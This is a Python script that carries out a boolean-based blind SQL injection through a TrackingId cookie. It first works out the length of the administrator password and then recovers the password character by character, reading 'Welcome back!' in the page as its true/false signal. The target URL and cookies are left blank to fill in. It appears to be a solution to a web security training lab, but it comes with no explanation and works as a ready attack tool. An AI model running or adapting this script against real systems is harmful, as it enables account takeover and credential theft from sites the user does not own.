import requests
import string
import sys

# Change your cookies and url here
trackingId = ""
session = ""
url = ""

letters = list(string.ascii_lowercase)
numbers = list(string.digits)
characters = letters + numbers
password = ""
password_length = 0

# Index
i = 0

while True:
  sqli = "' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND LENGTH(password) > {0}) = 'a".format(i)
  cookies = {
    "TrackingId":trackingId + sqli,
    "session":session
    }
  r = requests.get(url, cookies=cookies)

  if "Welcome back!" not in r.text:
    print("[*] The password length is {0} characters long".format(password_length))
    break
  else:
    print("[-] The password length is {0} characters long".format(password_length))
    i += 1
    password_length += 1

for i in range(password_length):
  for x in characters:
    sqli = "'AND (SELECT SUBSTRING(password, {0}, 1) FROM users WHERE username = 'administrator') = '{1}".format(i + 1, x)
    cookies = {
      "TrackingId":trackingId + sqli,
      "session":session
    }
    r = requests.get(url, cookies=cookies)

    if "Welcome back!" in r.text:
      password += x
      print("[-] The password for 'administrator' is: {0}".format(password))
      break

print("[*] The password for 'administrator' is: {0}".format(password))
sys.exit()